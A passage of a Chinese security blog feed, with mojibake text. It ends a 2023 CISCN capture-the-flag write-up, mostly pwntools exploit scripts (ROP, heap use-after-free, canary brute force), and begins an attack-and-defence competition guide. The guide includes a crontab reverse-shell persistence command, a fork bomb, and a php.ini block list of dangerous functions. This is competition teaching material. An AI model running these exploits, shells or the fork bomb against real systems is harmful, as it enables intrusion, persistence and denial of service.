class="hljs-comment">#rsi</span><br>rdx=<span class="hljs-number">0x00000000004a404b</span> <span class="hljs-comment">#rdx rbx</span><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;-100000&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(rdi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(fopen)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(<span class="hljs-number">0x4e60f0</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(read)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>p.sendline(payload)<br></code></pre></td></tr></table></figure>

<h2 id="StrangeTalkBot"><a href="#StrangeTalkBot" class="headerlink" title="StrangeTalkBot"></a>StrangeTalkBot</h2><p>ç¨‹åºä½¿ç”¨äº†<code>protobuf</code>åè®®è§£æè¾“å…¥æ•°æ®ï¼Œæ„é€ <code>protobuf</code>æ•°æ®ï¼Œä¼ å…¥å³å¯<br>ç¨‹åºä¸­å­˜åœ¨<code>uaf</code>æ¼æ´ä¸æ•°ç»„è¶Šç•Œæ¼æ´ï¼Œåˆ©ç”¨<code>gadget</code>æ„é€ æ ˆè¿ç§»ï¼Œå®ç°<code>orw</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> varint<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Mode</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x08&#x27;</span>+varint.encode(m&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Ind</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x10&#x27;</span>+varint.encode(i&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Size</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x18&#x27;</span>+varint.encode(s&lt;&lt;<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Data</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;\x22&#x27;</span>+varint.encode(<span class="hljs-built_in">len</span>(d))+d<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data=<span class="hljs-string">b&#x27; &#x27;</span></span>):<br>    payload=Mode(<span class="hljs-number">1</span>)+Ind(ind)+Size(size)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    payload=Mode(<span class="hljs-number">2</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(data)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">3</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    payload=Mode(<span class="hljs-number">4</span>)+Ind(ind)+Size(<span class="hljs-number">0</span>)+Data(<span class="hljs-string">b&#x27;&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">&quot;now: \n&quot;</span>,payload)<br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>    gdb.attach(p)<br><span class="hljs-keyword">else</span>:<br>    p=remote(<span class="hljs-string">&quot;123.56.244.196&quot;</span>,<span class="hljs-string">&quot;35492&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add(i,<span class="hljs-number">0xe8</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    free(i)<br><br>show(<span class="hljs-number">1</span>)<br>heap=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>show(<span class="hljs-number">2</span>)<br>heap1=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap1))<br><br>free(<span class="hljs-number">7</span>)<br>free(<span class="hljs-number">8</span>)<br><br>show(<span class="hljs-number">8</span>)<br>d=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-<span class="hljs-number">0x1eccc0</span><br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>gadget=libc.address+<span class="hljs-number">0x154dea</span><br>mprotect=libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>rdi=<span class="hljs-number">0x0000000000023b6a</span>+libc.address<br>rsi=<span class="hljs-number">0x000000000002601f</span>+libc.address<br>rdx=<span class="hljs-number">0x0000000000142c92</span>+libc.address<br>leave=libc.address+<span class="hljs-number">0x00000000000578c8</span><br>edit(<span class="hljs-number">6</span>,p64(free_hook))<br><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-number">0xe8</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span><br><br>edit(<span class="hljs-number">0</span>,flat([heap+<span class="hljs-number">0x48</span>,leave,<br>    heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    heap,<span class="hljs-number">0</span>,<br>    leave,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    heap,<br>    rdi,heap1&amp;<span class="hljs-number">0xfffffffffffff000</span>,<br>    rsi,<span class="hljs-number">0x1000</span>,<br>    rdx,<span class="hljs-number">7</span>,<br>    mprotect,<br>    heap1]))<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>)+shellcraft.read(<span class="hljs-number">3</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)+shellcraft.write(<span class="hljs-number">1</span>,heap-<span class="hljs-number">0x50</span>,<span class="hljs-number">0x50</span>)<br>edit(<span class="hljs-number">1</span>,asm(shellcode))<br><br>add(<span class="hljs-number">0x11</span>,<span class="hljs-number">0xe8</span>)<br>add(<span class="hljs-number">0x12</span>,<span class="hljs-number">0xe8</span>,p64(gadget))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br><br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="funcanary"><a href="#funcanary" class="headerlink" title="funcanary"></a>funcanary</h2><p>ç¨‹åºä½¿ç”¨äº†<code>fork</code>ï¼Œæ‰€ä»¥åœ¨å­è¿›ç¨‹ä¸­æŠ¥é”™ï¼Œä¸ä¼šä½¿ç¨‹åºä¸­æ–­ï¼Œæ‰€ä»¥çˆ†ç ´<code>canary</code>ï¼Œç„¶åè·³è½¬åˆ°åé—¨ä½ç½®å°±å¯ä»¥äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>backdoor=<span class="hljs-number">0x1229</span><br><br><span class="hljs-comment">#p=process(&quot;./funcanary&quot;)</span><br>p=remote(<span class="hljs-string">&quot;123.56.135.185&quot;</span>,<span class="hljs-string">&quot;32640&quot;</span>)<br><br>canary=<span class="hljs-string">b&#x27;\x00&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x100</span>):<br>        p.sendafter(<span class="hljs-string">b&#x27;welcome\n&#x27;</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+p8(j))<br>        data=p.readline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;stack&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>            <span class="hljs-built_in">print</span>(j)<br>            canary+=p8(j)<br>            <span class="hljs-keyword">break</span><br>i=<span class="hljs-number">0</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><span class="hljs-keyword">while</span> i&lt;<span class="hljs-number">0x10</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        data=p.readuntil(<span class="hljs-string">&#x27;welcome\n&#x27;</span>)<br>        f.write(data)<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span>+canary+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p16(<span class="hljs-number">0xffff</span>&amp;(<span class="hljs-number">0x1200</span>+j+i*<span class="hljs-number">0x1000</span>)))<br>        pause()<br>    i+=<span class="hljs-number">1</span><br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="Shell-We-Go"><a href="#Shell-We-Go" class="headerlink" title="Shell We Go"></a>Shell We Go</h2><p>å½“è®¤è¯ç»“æŸä¹‹åï¼Œæ‰§è¡Œ<code>echo</code>æŒ‡ä»¤ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œä½¿ç”¨<code>+</code>å¯ä»¥è·³è¿‡æ ˆç©ºé—´ï¼Œç›´æ¥è¦†ç›–è¿”å›å€¼<br>æ„é€ <code>rop</code>ï¼Œæ‰§è¡Œ<code>orw</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;47.93.187.243&quot;</span>,<span class="hljs-string">&quot;38686&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;cert nAcDsMicN  S33UAga1n@#!&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">bp 0x4c181a</span><br><span class="hljs-string">bp 0x4c18a0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">makepayload</span>(<span class="hljs-params">data</span>):<br>    e=<span class="hljs-string">b&#x27;&#x27;</span><br>    i=<span class="hljs-number">0</span><br>    step=<span class="hljs-number">0x20</span><br>    <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>        e+=data[i:i+step]+<span class="hljs-string">b&#x27; &#x27;</span><br>        i+=step<br>    <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;echo &#x27;</span>+e<br><br>rdi=<span class="hljs-number">0x0000000000444fec</span><br>system=<span class="hljs-number">0x43e7e6</span><br>rsi=<span class="hljs-number">0x000000000041e818</span><br>rdx=<span class="hljs-number">0x000000000049e11d</span><br>sh=<span class="hljs-number">0x4c38e7</span><br>rax=<span class="hljs-number">0x000000000040d9e6</span><br>flag=<span class="hljs-number">0x4c34c8</span><br>syscall=<span class="hljs-number">0x000000000040328c</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>bss=e.bss()<br><br>payload=<span class="hljs-string">b&#x27;+&#x27;</span>*(<span class="hljs-number">0x298</span>-<span class="hljs-number">0x78</span>)+<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">3</span>+p64(rdi)+p64(flag)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rdx)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<br>payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(bss+<span class="hljs-number">0x200</span>)+p64(rdx)+p64(<span class="hljs-number">0x40</span>)+p64(rax)+p64(<span class="hljs-number">1</span>)+p64(syscall)<br><br>p.sendline(makepayload(payload))<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="babyRE"><a href="#babyRE" class="headerlink" title="babyRE"></a>babyRE</h2><p><a href="https://snap.berkeley.edu/">https://snap.berkeley.edu/</a> å¯¼å…¥xml</p>
<p>å¯¼å‡ºå¯†æ–‡åå¼‚æˆ–å¾—åˆ°flag</p>
<p><img src="/img/wp/2023/2023ciscn-28.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">102</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">28</span>,<span class="hljs-number">74</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">85</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">75</span>,<span class="hljs-number">20</span>,<span class="hljs-number">92</span>,<span class="hljs-number">92</span>,<span class="hljs-number">8</span>,<span class="hljs-number">28</span>,<span class="hljs-number">25</span>,<span class="hljs-number">81</span>,<span class="hljs-number">83</span>,<span class="hljs-number">7</span>,<span class="hljs-number">28</span>,<span class="hljs-number">76</span>,<span class="hljs-number">88</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">29</span>,<span class="hljs-number">73</span>,<span class="hljs-number">0</span>,<span class="hljs-number">86</span>,<span class="hljs-number">4</span>,<span class="hljs-number">87</span>,<span class="hljs-number">87</span>,<span class="hljs-number">82</span>,<span class="hljs-number">84</span>,<span class="hljs-number">85</span>,<span class="hljs-number">4</span>,<span class="hljs-number">85</span>,<span class="hljs-number">87</span>,<span class="hljs-number">30</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(a)):<br>    a[i]=a[i]^a[i-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ciscn</tag>
        <tag>2023</tag>
      </tags>
  </entry>
  <entry>
    <title>AWDæ”»å‡»ä¸é˜²å¾¡</title>
    <url>/posts/6118732e/</url>
    <content><![CDATA[<h1 id="æ”»å‡»"><a href="#æ”»å‡»" class="headerlink" title="æ”»å‡»"></a>æ”»å‡»</h1><h2 id="ä¸»æœºå‘ç°"><a href="#ä¸»æœºå‘ç°" class="headerlink" title="ä¸»æœºå‘ç°"></a>ä¸»æœºå‘ç°</h2><p>å¦‚æœå®˜æ–¹æ²¡å…¬å¼€é¶æœºåœ°å€ï¼ˆé€šå¸¸ä¸ä¼šç»™ï¼‰ï¼Œåˆ™æ”»å‡»æ‰‹é¦–å…ˆè¦åšçš„äº‹å°±æ˜¯å…ˆæ‰¾åˆ°æ¯ä¸ªä¸»æœºåœ°å€å’Œç«¯å£</p>
<p>ç”¨å·¥å…·æˆ–è€…è‡ªå·±çš„è„šæœ¬éƒ½è¡Œï¼Œä¸è¿‡å»ºè®®æå‰å‡†å¤‡å¥½è„šæœ¬ï¼Œç°åœºå†™ä¼šæ…¢ä¸€ç‚¹å¯èƒ½è¿˜ä¼šå‡ºé—®é¢˜</p>
<h2 id="å¼±å£ä»¤"><a href="#å¼±å£ä»¤" class="headerlink" title="å¼±å£ä»¤"></a>å¼±å£ä»¤</h2><p><strong>sshå¼±å£ä»¤</strong><br>å¯èƒ½ä¼šæœ‰äº›é˜Ÿä¼æ²¡æœ‰æ”¹</p>
<p><strong>webå¼±å£ä»¤</strong><br>ä¸€èˆ¬åœ¨åå°ç™»å½•å¤„ï¼Œæˆ–è€…phpmyadminä¹‹ç±»çš„æœåŠ¡</p>
<h2 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h2><p>ä»£ç å®¡è®¡æ˜¯æ”»é˜²ä¸€ä½“çš„å·¥ä½œï¼Œå½“å‘ç°æ¼æ´æ—¶ï¼Œè¿›æ”»çš„åŒæ—¶è·Ÿé˜²å®ˆçš„é˜Ÿå‹å•†è®¨å¦‚ä½•ä¿®å¤</p>
<p><strong>é¢„ç•™åé—¨</strong><br>æŸäº›åœ°å¸‚çº§awdæ¯”èµ›ä¸ºäº†é™ä½éš¾åº¦ä¸€èˆ¬ä¼šè®¾ç½®ä¸€å¥è¯æœ¨é©¬ï¼Œæ³¨æ„ç¬¬ä¸€æ—¶é—´åˆ é™¤ç„¶åç”¨è„šæœ¬å»æ‰¹é‡æ‰“å…¶ä»–ä¸»æœº</p>
<p><strong>å…¶ä»–æ¼æ´</strong></p>
<p>å°†æºç ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå…ˆç”¨Dç›¾æˆ–è€…æ²³é©¬ç­‰æ‰«æå·¥å…·å¤§æ¦‚æ‰«æä¸‹ï¼Œåœ¨æ·±å…¥æŒ–æ˜æ¼æ´</p>
<h2 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h2><p><strong>ä¸æ­»é©¬</strong></p>
<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.dr0n.top/posts/46ef80a/">AWDä¸æ­»é©¬ä¸å…‹åˆ¶æ–¹æ³•</a></p>
<p><strong>å†…æ ¸æ¼æ´ææƒ</strong></p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">https://github.com/The-Z-Labs/linux-exploit-suggester<br></code></pre></td></tr></table></figure>

<p><strong>crontabå†™å®šæ—¶ä»»åŠ¡</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//æ¯åˆ†é’Ÿåå¼¹shellåˆ° 127.0.0.1çš„5353ç«¯å£<br>(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * * /bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/127.0.0.1/5353 0&gt;&amp;1&#x27;\n&quot;</span>)|crontab -<br></code></pre></td></tr></table></figure>



<h2 id="æ…å±"><a href="#æ…å±" class="headerlink" title="æ…å±"></a>æ…å±</h2><p>1ï¼šåˆ°æœ€åä¸€è½®æ—¶ï¼Œè¯¥æ‹¿å®Œçš„flagæ‹¿åˆ°æ—¶å¯ä»¥è¿›è¡Œåˆ ç«™ï¼Œæ— é™å¤åˆ¶ç­‰æ“ä½œ</p>
<p>2ï¼šforkç‚¸å¼¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##!/bin/sh</span><br>/bin/echo <span class="hljs-string">&#x27;.() &#123; .|.&amp; &#125; &amp;&amp; .&#x27;</span> &gt; /tmp/aaa;/bin/bash /tmp/aaa;<br></code></pre></td></tr></table></figure>

<h1 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h1><h2 id="webé˜²å¾¡"><a href="#webé˜²å¾¡" class="headerlink" title="webé˜²å¾¡"></a>webé˜²å¾¡</h2><h4 id="sshç™»å½•"><a href="#sshç™»å½•" class="headerlink" title="sshç™»å½•"></a>sshç™»å½•</h4><p>sshå‘½ä»¤ç™»å½•æˆ–è€…ä½¿ç”¨å›¾å½¢åŒ–å·¥å…·è¿æ¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">//sshè¿æ¥<br>ssh -p 2222 ctf@xx.xx.xx.xx<br><br>//å…å¯†ç™»å½•<br>ssh-copy-id -i ~/.ssh/id_rsa.pub ctf@xx.xx.xx.xx<br></code></pre></td></tr></table></figure>


<h4 id="å¤‡ä»½æºç "><a href="#å¤‡ä»½æºç " class="headerlink" title="å¤‡ä»½æºç "></a>å¤‡ä»½æºç </h4><p>æ¯”èµ›ä¸€å¼€å§‹å°±éœ€è¦æœ‰ä¸€ä¸ªé˜Ÿå‹å¯¹ç½‘ç«™æºç å’Œæ•°æ®åº“æ•°æ®è¿›è¡Œå¤‡ä»½ï¼Œå¦‚æœåç»­è¢«åˆ ç«™äº†å¯ä»¥åŠæ—¶æ¢å¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##ç½‘å€å¤‡ä»½</span><br>tar -zcvf web.tar.gz /var/www/html<br><br><span class="hljs-comment">##æ•°æ®åº“å¤‡ä»½-å…¨éƒ¨æ•°æ®</span><br>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql<br><span class="hljs-comment">##æ•°æ®åº“å¤‡ä»½-æŒ‡å®šæ•°æ®åº“å’Œè¡¨</span><br>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql<br><span class="hljs-comment">##æ•°æ®åº“æ¢å¤ï¼ˆmysqlç»ˆç«¯ä¸‹æ‰§è¡Œï¼‰</span><br><span class="hljs-built_in">source</span> /tmp/db.sql<br></code></pre></td></tr></table></figure>



<h4 id="æ”¹å¯†ç "><a href="#æ”¹å¯†ç " class="headerlink" title="æ”¹å¯†ç "></a>æ”¹å¯†ç </h4><p><strong>sshå¯†ç </strong><br>å¦‚æœå‘ç°æ‹¿åˆ°çš„sshå¯†ç ä¸æ˜¯ç±»ä¼¼äº<code>SDs2dKJaH5hs</code>çš„éšæœºå¼ºå£ä»¤ï¼Œè€Œæ˜¯ç±»ä¼¼äº<code>ctf/123456</code>ï¼Œåˆ™éœ€è¦æ›´æ”¹sshå¯†ç </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">passwd<br></code></pre></td></tr></table></figure>

<p><strong>webåå°å¯†ç </strong><br>ä¸€èˆ¬é¢˜ç›®å¤§æ¦‚ç‡æ˜¯ä¸€ä¸ªcmsæˆ–è€…è‡ªå·±å†™çš„ç½‘ç«™ï¼Œé‚£ä¹ˆåå°å°±æœ‰å¯èƒ½å­˜åœ¨å¼±å£ä»¤ï¼Œéœ€è¦ä¿®æ”¹</p>
<p><strong>mysqlå¯†ç </strong><br>mysqlå¯†ç æ˜¯å¾ˆå¤šé˜Ÿä¼ä¼šå¿½ç•¥çš„åœ°æ–¹ï¼Œå½“ç„¶ä¹ŸåŒæ ·é‡è¦ã€‚æ”¹å®Œè¦æ³¨æ„cmsä¸­çš„é…ç½®æ–‡ä»¶ï¼Œä¸ç„¶å¯èƒ½ä¼šå¯¼è‡´cmsè¿ä¸ä¸Šæ•°æ®åº“è€Œå´©æºƒ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##æ–¹æ³•ä¸€ï¼ˆmysqlç»ˆç«¯ä¸‹æ‰§è¡Œï¼‰</span><br>show databases;<br>use mysql<br><span class="hljs-built_in">set</span> password <span class="hljs-keyword">for</span> root@localhost = password(<span class="hljs-string">&#x27;123&#x27;</span>);<br><br><span class="hljs-comment">##æ–¹æ³•äºŒï¼ˆmysqlç»ˆç«¯ä¸‹æ‰§è¡Œï¼‰</span><br>update user <span class="hljs-built_in">set</span> password = PASSWORD(<span class="hljs-string">&#x27;éœ€è¦æ›´æ¢çš„å¯†ç &#x27;</span>) <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span>;<br>flush privileges;<br>show tables;<br><br><span class="hljs-comment">##æ–¹æ³•ä¸‰</span><br>mysqladmin -uç”¨æˆ·å -pæ—§å¯†ç  password æ–°å¯†ç <br></code></pre></td></tr></table></figure>



<h4 id="ä»£ç å®¡è®¡-1"><a href="#ä»£ç å®¡è®¡-1" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h4><p>ä¸€èˆ¬å…ˆç”¨Dç›¾ï¼Œæ²³é©¬ç­‰å·¥å…·æ‰«ä¸€éï¼Œå‘ç°ä¸€å¥è¯æœ¨é©¬ç­‰è¾ƒæ˜æ˜¾çš„æ¼æ´ï¼Œå†ç”¨seayç­‰æˆ–æ‰‹åŠ¨åˆ†æï¼Œæˆ–è€…å¯ä»¥æ‰¾æ‰¾å†å²æ¼æ´cveç­‰</p>
<p>æ‰¾åˆ°æ¼æ´åæ ¹æ®æ¼æ´çš„ç§ç±»è¿›è¡Œä¿®å¤</p>
<p>1ï¼šåˆ ç«™<br>ä¸å»ºè®®ã€‚å¦‚æœå‚èµ›æ‰‹å†Œä¸­æ²¡æœ‰æ˜ç¡®ç¦æ­¢ï¼Œè¿™æ˜¯æœ€ç®€å•ç²—æš´çš„å§¿åŠ¿</p>
<p>2ï¼šåˆ é¡µé¢<br>åªè¦åˆ æ‰æœ‰æ¼æ´çš„é¡µé¢å°±è¡Œäº†ï¼Œæ¯”å¦‚åˆ åå°ç™»å½•é¡µé¢ã€æ³¨å†Œé¡µé¢ã€ä¸Šä¼ é¡µé¢ç­‰ç­‰</p>
<p>3ï¼šç ´åæ­£å¸¸åŠŸèƒ½<br>å¦‚æœæ‰‹å†Œä¸­è§„å®šäº†ä¸èƒ½åˆ é™¤ä»»ä½•é¡µé¢ï¼Œåˆ™å¯ä»¥è®©è¿™äº›æ¼æ´ç‚¹çš„åŠŸèƒ½å‡½æ•°å¤±æ•ˆ</p>
<p>4ï¼šæ­£å¸¸ä¿®è¡¥æ‰‹æ®µ<br>å¦‚åŠ ç™½åå•ï¼Œå­—ç¬¦è¿‡æ»¤è½¬ä¹‰ï¼Œè®¾ç½®open_basedirç­‰ï¼Œæœ‰æƒé™è¿˜å¯ä»¥ä¿®æ”¹php.iniï¼Œæ”¹å®Œè®°å¾—é‡å¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">;ç¦ç”¨å±é™©å‡½æ•°<br>disable_functions = exec,system,shell_exec,popen,passthru,pcntl_exec,phpinfo<br><br>;é¢„é˜²sqlæ³¨å…¥<br>magic_quotes_gpc = on<br><br>;è¿œç¨‹æ–‡ä»¶åŒ…å«<br>allow_url_fopen = off<br>allow_url_include = off<br><br>;é‡å¯phpæœåŠ¡<br>service php-fpm restart<br></code></pre></td></tr></table></figure>



<h4 id="ä¸Šwaf"><a href="#ä¸Šwaf" class="headerlink" title="ä¸Šwaf"></a>ä¸Šwaf</h4><p>wafä¹Ÿæ˜¯æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹ã€‚ä¸€èˆ¬å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªç±»å‹ï¼Œä¸€ç§æ˜¯åªæœ‰ç›‘æ§çš„åŠŸèƒ½ï¼Œå¯ä»¥ç›‘æ§æµé‡æ–¹ä¾¿åˆ†æå…¶ä»–é˜Ÿçš„payloadï¼Œä¸€èˆ¬æ¯”èµ›çš„æ£€æŸ¥éƒ½èƒ½é€šè¿‡ã€‚å¦ä¸€ç§å°±æ˜¯å¸¦æ‹¦æˆªçš„é˜²å¾¡wafï¼Œä¹Ÿç§°é€šé˜²ï¼Œä¸€èˆ¬æ¯”èµ›ä¸å…è®¸ä½¿ç”¨</p>
<p>å‡ ä¸ªwafé¡¹ç›®</p>
